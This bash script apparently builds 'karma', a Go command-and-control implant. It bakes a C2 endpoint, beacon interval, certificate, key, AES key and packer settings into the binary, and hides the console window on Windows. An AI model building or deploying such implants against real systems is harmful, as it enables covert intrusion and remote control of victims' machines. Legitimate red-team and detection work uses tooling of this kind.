#!/bin/bash
set -e

GOOS=$1
GOARCH=$2
C2=$3
WAITSEC=$4
CERT=$5
KEY=$6
AESKEY=$7 # rest are base32 encoded
X1=$8 
X2=$9
UUID=${10}
PACKER=${11}
OUTFILE=${12}

LDFLAGS=(
    "-X 'main.InitC2Endpoint=${C2}'"
    "-X 'main.InitWaitSeconds=${WAITSEC}'"
    "-X 'main.InitUUID=${UUID}'"
    "-X 'main.certData=${CERT}'"
    "-X 'main.keyData=${KEY}'"
    "-X 'main.InitAESKey=${AESKEY}'"
    "-X 'main.X1=${X1}'"
    "-X 'main.X2=${X2}'"    
    "-X 'main.InitPFile=${PACKER}'"
)

OLDDIR=$PWD
if [ "${GOOS}" == "windows" ]; then
    LDFLAGS+=("-H=windowsgui")
fi

if [ ! -z "$OUTFILE" ]; then
    LOCATION=$OUTFILE
    OUTFILE="-o ${OUTFILE}"
fi

cd $(dirname $0)
GOOS=${GOOS} GOARCH=${GOARCH} go build -ldflags="${LDFLAGS[*]}" ${OUTFILE}


if [ -z "$OUTFILE" ]; then
    LOCATION=$OLDDIR/bin
    mkdir -p $LOCATION
    mv karma* $LOCATION
fi
echo "'karma' instance saved at $LOCATION"